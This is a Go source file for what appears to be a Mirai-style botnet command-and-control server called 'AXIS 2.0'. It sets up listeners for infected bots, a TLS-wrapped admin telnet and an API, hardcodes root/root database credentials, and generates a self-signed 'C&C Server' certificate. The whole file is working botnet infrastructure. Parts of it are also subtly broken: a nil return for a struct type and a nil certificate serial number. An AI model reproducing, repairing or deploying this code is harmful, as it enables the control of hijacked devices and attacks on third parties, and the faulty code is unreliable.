package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"net"
	"os"
	"time"

	"crypto/x509/pkix"
)

// ============================================================================
// AXIS 2.0 C&C SERVER CONFIGURATION
// ============================================================================
// Database: MySQL/MariaDB for user management and logging
// Bot Connections: Unencrypted internal protocol on port 3778
// Admin Access: TLS-encrypted telnet on port 3777
// API: REST API on port 3779 (optional)
// ============================================================================
const DatabaseAddr string = "127.0.0.1:3306"
const DatabaseUser string = "root"
const DatabasePass string = "root"
const DatabaseTable string = "AXIS2"

// C&C Server listen address (0.0.0.0 for all interfaces)
// This is for BOT connections (unencrypted, internal protocol)
const CNCListenAddr string = "0.0.0.0:3778"

// Encrypted Telnet Server listen address (TLS-wrapped telnet for admin access)
const TelnetTLSListenAddr string = "0.0.0.0:3777"

// TLS Certificate and Key file paths (will be auto-generated if not exists)
const TLSCertPath string = "tls_cert.pem"
const TLSKeyPath string = "tls_key.pem"

// API Server listen address (set to empty string to disable API)
const APIListenAddr string = "0.0.0.0:3779"

// ============================================================================

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
	// Start C&C server for bot connections (unencrypted internal protocol)
	tel, err := net.Listen("tcp", CNCListenAddr)
	if err != nil {
		fmt.Printf("Failed to start C&C server: %v\n", err)
		return
	}

	// Start Encrypted Telnet server for admin connections (TLS-wrapped)
	if TelnetTLSListenAddr != "" {
		cert, err := getOrCreateTLSCertificate()
		if err != nil {
			fmt.Printf("Failed to load TLS certificate: %v\n", err)
			return
		}

		tlsConfig := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12, // Only TLS 1.2 and above
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			},
		}

		tlsListener, err := tls.Listen("tcp", TelnetTLSListenAddr, tlsConfig)
		if err != nil {
			fmt.Printf("Failed to start encrypted telnet listener: %v\n", err)
			return
		}

		go func() {
			fmt.Printf("AXIS 2.0 Encrypted Telnet Server (TLS) listening on %s\n", TelnetTLSListenAddr)
			for {
				conn, err := tlsListener.Accept()
				if err != nil {
					fmt.Printf("Failed to accept encrypted telnet connection: %v\n", err)
					break
				}
				go NewAdmin(conn).Handle()
			}
		}()
	}

	// Start API server if configured
	if APIListenAddr != "" {
		api, err := net.Listen("tcp", APIListenAddr)
		if err != nil {
			fmt.Printf("Failed to start API server: %v\n", err)
			return
		}

		go func() {
			for {
				conn, err := api.Accept()
				if err != nil {
					break
				}
				go apiHandler(conn)
			}
		}()
	}

	fmt.Printf("AXIS 2.0 C&C Server listening on %s\n", CNCListenAddr)

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	// Bot connections start with 4 bytes where first 3 are 0x00
	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			string_len := make([]byte, 1)
			l, err := conn.Read(string_len)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if string_len[0] > 0 {
				source_buf := make([]byte, string_len[0])
				l, err := conn.Read(source_buf)
				if err != nil || l <= 0 {
					return
				}
				source = string(source_buf)
			}
			NewBot(conn, buf[3], source).Handle()
		} else {
			NewBot(conn, buf[3], "").Handle()
		}
	} else {
		// Admin telnet session
		NewAdmin(conn).Handle()
	}
}

func apiHandler(conn net.Conn) {
	defer conn.Close()
	NewApi(conn).Handle()
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}

// getOrCreateTLSCertificate loads or generates a TLS certificate
func getOrCreateTLSCertificate() (tls.Certificate, error) {
	// Try to read existing certificate and key
	certBytes, certErr := os.ReadFile(TLSCertPath)
	keyBytes, keyErr := os.ReadFile(TLSKeyPath)

	if certErr == nil && keyErr == nil {
		cert, err := tls.X509KeyPair(certBytes, keyBytes)
		if err == nil {
			return cert, nil
		}
	}

	// Generate new self-signed certificate
	fmt.Println("Generating new TLS certificate...")

	// Generate private key
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	// Create certificate template
	template := x509.Certificate{
		SerialNumber: nil,
		Subject: pkix.Name{
			Organization: []string{"AXIS 2.0"},
			CommonName:   "AXIS 2.0 C&C Server",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour), // Valid for 1 year
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	// Create certificate
	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return nil, err
	}

	// Encode certificate to PEM
	certPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "CERTIFICATE",
		Bytes: certDER,
	})

	// Encode private key to PEM
	keyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	})

	// Save certificate
	if err := os.WriteFile(TLSCertPath, certPEM, 0644); err != nil {
		return nil, err
	}

	// Save private key with restricted permissions
	if err := os.WriteFile(TLSKeyPath, keyPEM, 0600); err != nil {
		return nil, err
	}

	fmt.Printf("TLS certificate generated: %s, %s\n", TLSCertPath, TLSKeyPath)

	// Load and return certificate
	return tls.X509KeyPair(certPEM, keyPEM)
}
